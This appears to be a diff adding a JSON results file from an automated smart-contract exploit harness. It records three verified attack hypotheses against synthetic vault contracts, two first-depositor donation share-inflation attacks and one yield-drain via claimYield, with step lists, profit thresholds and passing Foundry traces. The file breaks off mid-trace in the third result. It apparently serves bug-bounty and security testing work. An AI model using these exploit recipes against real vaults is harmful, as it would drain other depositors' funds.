@@ -1,0 +1,666 @@
+{
+  "case_id": "synthetic_poc_forge",
+  "mode": "codex-cli",
+  "model": "codex-default",
+  "stub": false,
+  "tool_calls": 50,
+  "turns": 9,
+  "hypotheses": [
+    {
+      "id": "synthetic_poc_forge-1",
+      "mode": "research",
+      "forge_root": "/home/sane100400/projects/bounty/poc-forge",
+      "project_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "poc_path": "test/AttackHarness_synthetic_poc_forge_1.t.sol",
+      "vuln_class": "donation_share_inflation",
+      "target": {
+        "contract": "SyntheticVault",
+        "function": "deposit(uint256)",
+        "file": "src/SyntheticVault.sol",
+        "lines": "L29-L45"
+      },
+      "initial_state": {
+        "fork": null,
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "101000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "victim",
+            "role": "victim",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "200000000000000000000"
+              }
+            ]
+          }
+        ],
+        "deployments": [
+          "deploy:MockToken()",
+          "deploy:SyntheticVault(MockToken)"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "vault.totalShares() == 0",
+          "token.balanceOf(attacker) == 101 ether",
+          "token.balanceOf(victim) == 200 ether"
+        ],
+        "setup_calls": []
+      },
+      "post_vuln_state": {
+        "class_invariant": "attacker_token_increased",
+        "profit_min_raw": "49000000000000000000",
+        "profit_asset": "MockToken",
+        "profit_token_decimals": 18
+      },
+      "invariant": {
+        "halmos_check": false
+      },
+      "attack_steps": [
+        "Attacker makes the first 1 wei deposit and receives one share.",
+        "Attacker donates 100 MockToken directly to the vault, inflating totalAssets without minting shares.",
+        "Victim deposits 200 MockToken and receives only one share due to the inflated denominator.",
+        "Attacker redeems the original share and exits with more MockToken than the funded starting balance."
+      ],
+      "preconditions": [
+        "The vault uses live token.balanceOf(address(this)) in share pricing.",
+        "Direct token transfers to the vault are possible."
+      ],
+      "rationale": "SyntheticVault.deposit prices new shares against donation-inflated totalAssets before pulling the victim deposit. A first depositor can own half the final share supply after contributing only one share, then redeem victim-funded assets for profit.",
+      "triage": {
+        "score": 0.98,
+        "duplicates": [],
+        "status": "verified"
+      }
+    },
+    {
+      "id": "synthetic_poc_forge-2",
+      "mode": "research",
+      "forge_root": "/home/sane100400/projects/bounty/poc-forge",
+      "project_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "poc_path": "test/AttackHarness_synthetic_poc_forge_2.t.sol",
+      "vuln_class": "donation_share_inflation",
+      "target": {
+        "contract": "MultiBugVault",
+        "function": "deposit(uint256)",
+        "file": "src/MultiBugVault.sol",
+        "lines": "L59-L71"
+      },
+      "initial_state": {
+        "fork": null,
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "101000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "victim",
+            "role": "victim",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "100000000000000000000"
+              }
+            ]
+          }
+        ],
+        "deployments": [
+          "deploy:MockToken()",
+          "deploy:MultiBugVault(MockToken)"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "vault.totalShares() == 0",
+          "token.balanceOf(attacker) == 101 ether",
+          "token.balanceOf(victim) == 100 ether"
+        ],
+        "setup_calls": []
+      },
+      "post_vuln_state": {
+        "class_invariant": "attacker_token_increased",
+        "profit_min_raw": "99000000000000000000",
+        "profit_asset": "MockToken",
+        "profit_token_decimals": 18
+      },
+      "invariant": {
+        "halmos_check": false
+      },
+      "attack_steps": [
+        "Attacker deposits 1 wei to become the first shareholder.",
+        "Attacker donates 100 MockToken directly to the vault.",
+        "Victim deposits 100 MockToken, but deposit mints zero shares because the denominator was donation-inflated.",
+        "Attacker withdraws the only share and receives the entire vault balance."
+      ],
+      "preconditions": [
+        "The vault accepts direct token transfers.",
+        "deposit(uint256) does not reject zero-share mints."
+      ],
+      "rationale": "MultiBugVault.deposit uses the live vault balance minus the current deposit as the share-pricing denominator and does not require minted shares to be nonzero. A first depositor can inflate the denominator by donation, make the victim mint zero shares, and withdraw all assets with the only share.",
+      "triage": {
+        "score": 0.99,
+        "duplicates": [],
+        "status": "verified"
+      }
+    },
+    {
+      "id": "synthetic_poc_forge-3",
+      "mode": "research",
+      "forge_root": "/home/sane100400/projects/bounty/poc-forge",
+      "project_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "poc_path": "test/AttackHarness_synthetic_poc_forge_3.t.sol",
+      "vuln_class": "rounding_dust_drain",
+      "target": {
+        "contract": "MultiBugVault",
+        "function": "claimYield()",
+        "file": "src/MultiBugVault.sol",
+        "lines": "L84-L103"
+      },
+      "initial_state": {
+        "fork": null,
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "1000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "victim",
+            "role": "victim",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "100000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "owner",
+            "role": "admin",
+            "starting_balance_wei": "0",
+            "starting_tokens": []
+          }
+        ],
+        "deployments": [
+          "deploy:MockToken()",
+          "deploy:MultiBugVault(MockToken)"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "vault.yieldPerSharePpb() == 1000000000",
+          "vault.shares(attacker) == 1 ether",
+          "token.balanceOf(address(vault)) == 101 ether"
+        ],
+        "setup_calls": [
+          "victim deposits 100 ether",
+          "attacker deposits 1 ether",
+          "owner sets yieldPerSharePpb to 1e9"
+        ]
+      },
+      "post_vuln_state": {
+        "class_invariant": "attacker_token_increased",
+        "profit_min_raw": "99000000000000000000",
+        "profit_asset": "MockToken",
+        "profit_token_decimals": 18
+      },
+      "invariant": {
+        "halmos_check": false
+      },
+      "attack_steps": [
+        "Victim supplies 100 MockToken to the vault.",
+        "Attacker supplies 1 MockToken to receive one token-denominated share.",
+        "After the owner enables yield, attacker initializes lastClaim and waits 101 seconds.",
+        "claimYield pays 101 MockToken from the pooled vault balance to the attacker, draining the victim-funded principal."
+      ],
+      "preconditions": [
+        "The owner has configured a positive yieldPerSharePpb.",
+        "Yield payments are not separated from user principal or capped by realized yield."
+      ],
+      "rationale": "MultiBugVault.claimYield calculates owed yield from timestamp delta and user shares, then transfers directly from the pooled token balance. With positive configured yield, a small shareholder can claim more than their principal and extract other depositors' assets because the function has no realized-yield reserve or per-user accounting cap.",
+      "triage": {
+        "score": 0.9,
+        "duplicates": [],
+        "status": "verified"
+      }
+    }
+  ],
+  "verified": [
+    {
+      "id": "synthetic_poc_forge-1",
+      "mode": "research",
+      "forge_root": "/home/sane100400/projects/bounty/poc-forge",
+      "project_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "poc_path": "test/AttackHarness_synthetic_poc_forge_1.t.sol",
+      "vuln_class": "donation_share_inflation",
+      "target": {
+        "contract": "SyntheticVault",
+        "function": "deposit(uint256)",
+        "file": "src/SyntheticVault.sol",
+        "lines": "L29-L45"
+      },
+      "initial_state": {
+        "fork": null,
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "101000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "victim",
+            "role": "victim",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "200000000000000000000"
+              }
+            ]
+          }
+        ],
+        "deployments": [
+          "deploy:MockToken()",
+          "deploy:SyntheticVault(MockToken)"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "vault.totalShares() == 0",
+          "token.balanceOf(attacker) == 101 ether",
+          "token.balanceOf(victim) == 200 ether"
+        ],
+        "setup_calls": []
+      },
+      "post_vuln_state": {
+        "class_invariant": "attacker_token_increased",
+        "profit_min_raw": "49000000000000000000",
+        "profit_asset": "MockToken",
+        "profit_token_decimals": 18
+      },
+      "invariant": {
+        "halmos_check": false
+      },
+      "attack_steps": [
+        "Attacker makes the first 1 wei deposit and receives one share.",
+        "Attacker donates 100 MockToken directly to the vault, inflating totalAssets without minting shares.",
+        "Victim deposits 200 MockToken and receives only one share due to the inflated denominator.",
+        "Attacker redeems the original share and exits with more MockToken than the funded starting balance."
+      ],
+      "preconditions": [
+        "The vault uses live token.balanceOf(address(this)) in share pricing.",
+        "Direct token transfers to the vault are possible."
+      ],
+      "rationale": "SyntheticVault.deposit prices new shares against donation-inflated totalAssets before pulling the victim deposit. A first depositor can own half the final share supply after contributing only one share, then redeem victim-funded assets for profit.",
+      "triage": {
+        "score": 0.98,
+        "duplicates": [],
+        "status": "verified"
+      }
+    },
+    {
+      "id": "synthetic_poc_forge-2",
+      "mode": "research",
+      "forge_root": "/home/sane100400/projects/bounty/poc-forge",
+      "project_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "poc_path": "test/AttackHarness_synthetic_poc_forge_2.t.sol",
+      "vuln_class": "donation_share_inflation",
+      "target": {
+        "contract": "MultiBugVault",
+        "function": "deposit(uint256)",
+        "file": "src/MultiBugVault.sol",
+        "lines": "L59-L71"
+      },
+      "initial_state": {
+        "fork": null,
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "101000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "victim",
+            "role": "victim",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "100000000000000000000"
+              }
+            ]
+          }
+        ],
+        "deployments": [
+          "deploy:MockToken()",
+          "deploy:MultiBugVault(MockToken)"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "vault.totalShares() == 0",
+          "token.balanceOf(attacker) == 101 ether",
+          "token.balanceOf(victim) == 100 ether"
+        ],
+        "setup_calls": []
+      },
+      "post_vuln_state": {
+        "class_invariant": "attacker_token_increased",
+        "profit_min_raw": "99000000000000000000",
+        "profit_asset": "MockToken",
+        "profit_token_decimals": 18
+      },
+      "invariant": {
+        "halmos_check": false
+      },
+      "attack_steps": [
+        "Attacker deposits 1 wei to become the first shareholder.",
+        "Attacker donates 100 MockToken directly to the vault.",
+        "Victim deposits 100 MockToken, but deposit mints zero shares because the denominator was donation-inflated.",
+        "Attacker withdraws the only share and receives the entire vault balance."
+      ],
+      "preconditions": [
+        "The vault accepts direct token transfers.",
+        "deposit(uint256) does not reject zero-share mints."
+      ],
+      "rationale": "MultiBugVault.deposit uses the live vault balance minus the current deposit as the share-pricing denominator and does not require minted shares to be nonzero. A first depositor can inflate the denominator by donation, make the victim mint zero shares, and withdraw all assets with the only share.",
+      "triage": {
+        "score": 0.99,
+        "duplicates": [],
+        "status": "verified"
+      }
+    },
+    {
+      "id": "synthetic_poc_forge-3",
+      "mode": "research",
+      "forge_root": "/home/sane100400/projects/bounty/poc-forge",
+      "project_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "poc_path": "test/AttackHarness_synthetic_poc_forge_3.t.sol",
+      "vuln_class": "rounding_dust_drain",
+      "target": {
+        "contract": "MultiBugVault",
+        "function": "claimYield()",
+        "file": "src/MultiBugVault.sol",
+        "lines": "L84-L103"
+      },
+      "initial_state": {
+        "fork": null,
+        "actors": [
+          {
+            "name": "attacker",
+            "role": "attacker",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "1000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "victim",
+            "role": "victim",
+            "starting_balance_wei": "0",
+            "starting_tokens": [
+              {
+                "token": "MockToken",
+                "amount": "100000000000000000000"
+              }
+            ]
+          },
+          {
+            "name": "owner",
+            "role": "admin",
+            "starting_balance_wei": "0",
+            "starting_tokens": []
+          }
+        ],
+        "deployments": [
+          "deploy:MockToken()",
+          "deploy:MultiBugVault(MockToken)"
+        ]
+      },
+      "pre_vuln_state": {
+        "assertions": [
+          "vault.yieldPerSharePpb() == 1000000000",
+          "vault.shares(attacker) == 1 ether",
+          "token.balanceOf(address(vault)) == 101 ether"
+        ],
+        "setup_calls": [
+          "victim deposits 100 ether",
+          "attacker deposits 1 ether",
+          "owner sets yieldPerSharePpb to 1e9"
+        ]
+      },
+      "post_vuln_state": {
+        "class_invariant": "attacker_token_increased",
+        "profit_min_raw": "99000000000000000000",
+        "profit_asset": "MockToken",
+        "profit_token_decimals": 18
+      },
+      "invariant": {
+        "halmos_check": false
+      },
+      "attack_steps": [
+        "Victim supplies 100 MockToken to the vault.",
+        "Attacker supplies 1 MockToken to receive one token-denominated share.",
+        "After the owner enables yield, attacker initializes lastClaim and waits 101 seconds.",
+        "claimYield pays 101 MockToken from the pooled vault balance to the attacker, draining the victim-funded principal."
+      ],
+      "preconditions": [
+        "The owner has configured a positive yieldPerSharePpb.",
+        "Yield payments are not separated from user principal or capped by realized yield."
+      ],
+      "rationale": "MultiBugVault.claimYield calculates owed yield from timestamp delta and user shares, then transfers directly from the pooled token balance. With positive configured yield, a small shareholder can claim more than their principal and extract other depositors' assets because the function has no realized-yield reserve or per-user accounting cap.",
+      "triage": {
+        "score": 0.9,
+        "duplicates": [],
+        "status": "verified"
+      }
+    }
+  ],
+  "verification_results": [
+    {
+      "hypothesis_id": "synthetic_poc_forge-1",
+      "test_id": "synthetic_poc_forge_1",
+      "test_name": "testPoC_synthetic_poc_forge_1",
+      "results": [
+        {
+          "gate": "compile",
+          "passed": true,
+          "detail": "targeted build ok: test/AttackHarness_synthetic_poc_forge_1.t.sol",
+          "artifact": "No files changed, compilation skipped\n\nwarning[erc20-unchecked-transfer]: ERC20 'transfer' and 'transferFrom' calls should check the return value\n  --> test/AttackHarness_synthetic_poc_forge_1.t.sol:28:9\n   |\n28 |         token.transfer(address(vault), 100 ether);\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n   |\n   = help: https://book.getfoundry.sh/reference/forge/forge-lint#erc20-unchecked-transfer\n\n"
+        },
+        {
+          "gate": "execute",
+          "passed": true,
+          "detail": "",
+          "artifact": "No files changed, compilation skipped\n\nRan 1 test for test/AttackHarness_synthetic_poc_forge_1.t.sol:AttackHarness_synthetic_poc_forge_1\n[PASS] testPoC_synthetic_poc_forge_1() (gas: 176001)\nTraces:\n  [200701] AttackHarness_synthetic_poc_forge_1::testPoC_synthetic_poc_forge_1()\n    \u251c\u2500 [2824] MockToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 101000000000000000000 [1.01e20]\n    \u251c\u2500 [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [23129] MockToken::approve(SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [73727] SyntheticVault::deposit(1)\n    \u2502   \u251c\u2500 [27095] MockToken::transferFrom(0x00000000000000000000000000000000000A11cE, SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1)\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u2514\u2500 \u2190 [Return] 1\n    \u251c\u2500 [1880] MockToken::transfer(SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000000000000000 [1e20])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [0] VM::stopPrank()\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [0] VM::startPrank(0x0000000000000000000000000000000000000B0b)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [23129] MockToken::approve(SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [34457] SyntheticVault::deposit(200000000000000000000 [2e20])\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 100000000000000000001 [1e20]\n    \u2502   \u251c\u2500 [7195] MockToken::transferFrom(0x0000000000000000000000000000000000000B0b, SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 200000000000000000000 [2e20])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u2514\u2500 \u2190 [Return] 1\n    \u251c\u2500 [0] VM::stopPrank()\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [824] MockToken::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 0\n    \u251c\u2500 [0] VM::prank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [7178] SyntheticVault::redeem(1)\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(SyntheticVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 300000000000000000001 [3e20]\n    \u2502   \u251c\u2500 [1880] MockToken::transfer(0x00000000000000000000000000000000000A11cE, 150000000000000000000 [1.5e20])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u2514\u2500 \u2190 [Return] 150000000000000000000 [1.5e20]\n    \u251c\u2500 [824] MockToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 150999999999999999999 [1.509e20]\n    \u251c\u2500 emit InvariantEvidence(classInvariant: \"attacker_token_increased\", subject: 0x00000000000000000000000000000000000A11cE, asset: MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], beforeValue: 101000000000000000000 [1.01e20], afterValue: 150999999999999999999 [1.509e20], delta: 49999999999999999999 [4.999e19], threshold: 49000000000000000000 [4.9e19])\n    \u2514\u2500 \u2190 [Stop]\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.64ms (427.55\u00b5s CPU time)\n\nRan 1 test suite in 14.58ms (1.64ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n\n"
+        },
+        {
+          "gate": "semantic",
+          "passed": true,
+          "detail": "",
+          "artifact": ""
+        },
+        {
+          "gate": "state_delta",
+          "passed": true,
+          "detail": "attacker_token_increased delta=49999999999999999999",
+          "artifact": "{\"class_invariant\": \"attacker_token_increased\", \"subject\": \"0x00000000000000000000000000000000000A11cE\", \"asset\": \"0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f\", \"before\": 101000000000000000000, \"after\": 150999999999999999999, \"delta\": 49999999999999999999, \"threshold\": 49000000000000000000}"
+        },
+        {
+          "gate": "econ",
+          "passed": true,
+          "detail": "raw_delta=49999999999999999999 >= min_profit_raw=49000000000000000000; gas-vs-profit skipped because profit_token_price_wei is missing",
+          "artifact": ""
+        },
+        {
+          "gate": "dup",
+          "passed": true,
+          "detail": "warning: matched detectors [{'check': 'reentrancy-no-eth', 'impact': 'Medium', 'lines': '29-45'}, {'check': 'reentrancy-benign', 'impact': 'Low', 'lines': '29-45'}] (not hard-failed outside immunefi_bounty)",
+          "artifact": ""
+        },
+        {
+          "gate": "halmos",
+          "passed": true,
+          "detail": "not requested",
+          "artifact": ""
+        }
+      ],
+      "forge_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "exit_code": 0,
+      "hypothesis_path": "/home/sane100400/projects/bounty/poc-forge/.harness_runs/H1_codex_harness/synthetic_poc_forge/synthetic_poc_forge-1.json",
+      "elapsed_sec": 1.889
+    },
+    {
+      "hypothesis_id": "synthetic_poc_forge-2",
+      "test_id": "synthetic_poc_forge_2",
+      "test_name": "testPoC_synthetic_poc_forge_2",
+      "results": [
+        {
+          "gate": "compile",
+          "passed": true,
+          "detail": "targeted build ok: test/AttackHarness_synthetic_poc_forge_2.t.sol",
+          "artifact": "No files changed, compilation skipped\n\nwarning[erc20-unchecked-transfer]: ERC20 'transfer' and 'transferFrom' calls should check the return value\n  --> test/AttackHarness_synthetic_poc_forge_2.t.sol:29:9\n   |\n29 |         token.transfer(address(vault), 100 ether);\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n   |\n   = help: https://book.getfoundry.sh/reference/forge/forge-lint#erc20-unchecked-transfer\n\n"
+        },
+        {
+          "gate": "execute",
+          "passed": true,
+          "detail": "",
+          "artifact": "No files changed, compilation skipped\n\nRan 1 test for test/AttackHarness_synthetic_poc_forge_2.t.sol:AttackHarness_synthetic_poc_forge_2\n[PASS] testPoC_synthetic_poc_forge_2() (gas: 141658)\nTraces:\n  [182338] AttackHarness_synthetic_poc_forge_2::testPoC_synthetic_poc_forge_2()\n    \u251c\u2500 [2824] MockToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 101000000000000000000 [1.01e20]\n    \u251c\u2500 [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [23129] MockToken::approve(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [75041] MultiBugVault::deposit(1)\n    \u2502   \u251c\u2500 [27095] MockToken::transferFrom(0x00000000000000000000000000000000000A11cE, MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1)\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 1\n    \u2502   \u2514\u2500 \u2190 [Return] 1\n    \u251c\u2500 [1880] MockToken::transfer(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000000000000000 [1e20])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [0] VM::stopPrank()\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [0] VM::startPrank(0x0000000000000000000000000000000000000B0b)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [23129] MockToken::approve(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [14041] MultiBugVault::deposit(100000000000000000000 [1e20])\n    \u2502   \u251c\u2500 [7195] MockToken::transferFrom(0x0000000000000000000000000000000000000B0b, MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000000000000000 [1e20])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 200000000000000000001 [2e20]\n    \u2502   \u2514\u2500 \u2190 [Return] 0\n    \u251c\u2500 [0] VM::stopPrank()\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [846] MultiBugVault::shares(0x0000000000000000000000000000000000000B0b) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 0\n    \u251c\u2500 [824] MockToken::balanceOf(0x0000000000000000000000000000000000000B0b) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 0\n    \u251c\u2500 [0] VM::prank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [6268] MultiBugVault::withdraw(1)\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 200000000000000000001 [2e20]\n    \u2502   \u251c\u2500 [1880] MockToken::transfer(0x00000000000000000000000000000000000A11cE, 200000000000000000001 [2e20])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u2514\u2500 \u2190 [Stop]\n    \u251c\u2500 [824] MockToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 201000000000000000000 [2.01e20]\n    \u251c\u2500 emit InvariantEvidence(classInvariant: \"attacker_token_increased\", subject: 0x00000000000000000000000000000000000A11cE, asset: MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], beforeValue: 101000000000000000000 [1.01e20], afterValue: 201000000000000000000 [2.01e20], delta: 100000000000000000000 [1e20], threshold: 99000000000000000000 [9.9e19])\n    \u2514\u2500 \u2190 [Stop]\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 908.48\u00b5s (319.22\u00b5s CPU time)\n\nRan 1 test suite in 13.03ms (908.48\u00b5s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n\n"
+        },
+        {
+          "gate": "semantic",
+          "passed": true,
+          "detail": "",
+          "artifact": ""
+        },
+        {
+          "gate": "state_delta",
+          "passed": true,
+          "detail": "attacker_token_increased delta=100000000000000000000",
+          "artifact": "{\"class_invariant\": \"attacker_token_increased\", \"subject\": \"0x00000000000000000000000000000000000A11cE\", \"asset\": \"0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f\", \"before\": 101000000000000000000, \"after\": 201000000000000000000, \"delta\": 100000000000000000000, \"threshold\": 99000000000000000000}"
+        },
+        {
+          "gate": "econ",
+          "passed": true,
+          "detail": "raw_delta=100000000000000000000 >= min_profit_raw=99000000000000000000; gas-vs-profit skipped because profit_token_price_wei is missing",
+          "artifact": ""
+        },
+        {
+          "gate": "dup",
+          "passed": true,
+          "detail": "warning: matched detectors [{'check': 'unchecked-transfer', 'impact': 'High', 'lines': '59-71'}, {'check': 'incorrect-equality', 'impact': 'Medium', 'lines': '59-71'}, {'check': 'reentrancy-benign', 'impact': 'Low', 'lines': '59-71'}] (not hard-failed outside immunefi_bounty)",
+          "artifact": ""
+        },
+        {
+          "gate": "halmos",
+          "passed": true,
+          "detail": "not requested",
+          "artifact": ""
+        }
+      ],
+      "forge_dir": "/home/sane100400/projects/bounty/poc-forge",
+      "exit_code": 0,
+      "hypothesis_path": "/home/sane100400/projects/bounty/poc-forge/.harness_runs/H1_codex_harness/synthetic_poc_forge/synthetic_poc_forge-2.json",
+      "elapsed_sec": 2.18
+    },
+    {
+      "hypothesis_id": "synthetic_poc_forge-3",
+      "test_id": "synthetic_poc_forge_3",
+      "test_name": "testPoC_synthetic_poc_forge_3",
+      "results": [
+        {
+          "gate": "compile",
+          "passed": true,
+          "detail": "targeted build ok: test/AttackHarness_synthetic_poc_forge_3.t.sol",
+          "artifact": "No files changed, compilation skipped\n\n"
+        },
+        {
+          "gate": "execute",
+          "passed": true,
+          "detail": "",
+          "artifact": "No files changed, compilation skipped\n\nRan 1 test for test/AttackHarness_synthetic_poc_forge_3.t.sol:AttackHarness_synthetic_poc_forge_3\n[PASS] testPoC_synthetic_poc_forge_3() (gas: 221068)\nTraces:\n  [245768] AttackHarness_synthetic_poc_forge_3::testPoC_synthetic_poc_forge_3()\n    \u251c\u2500 [2824] MockToken::balanceOf(0x00000000000000000000000000000000000A11cE) [staticcall]\n    \u2502   \u2514\u2500 \u2190 [Return] 1000000000000000000 [1e18]\n    \u251c\u2500 [0] VM::startPrank(0x0000000000000000000000000000000000000B0b)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [23129] MockToken::approve(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    \u251c\u2500 [77041] MultiBugVault::deposit(100000000000000000000 [1e20])\n    \u2502   \u251c\u2500 [29095] MockToken::transferFrom(0x0000000000000000000000000000000000000B0b, MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000000000000000 [1e20])\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] true\n    \u2502   \u251c\u2500 [824] MockToken::balanceOf(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]\n    \u2502   \u2502   \u2514\u2500 \u2190 [Return] 100000000000000000000 [1e20]\n    \u2502   \u2514\u2500 \u2190 [Return] 100000000000000000000 [1e20]\n    \u251c\u2500 [0] VM::stopPrank()\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)\n    \u2502   \u2514\u2500 \u2190 [Return]\n    \u251c\u2500 [23129] MockToken::approve(MultiBugVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])\n    \u2502   \u2514\u2500 \u2190 [Return] true\n    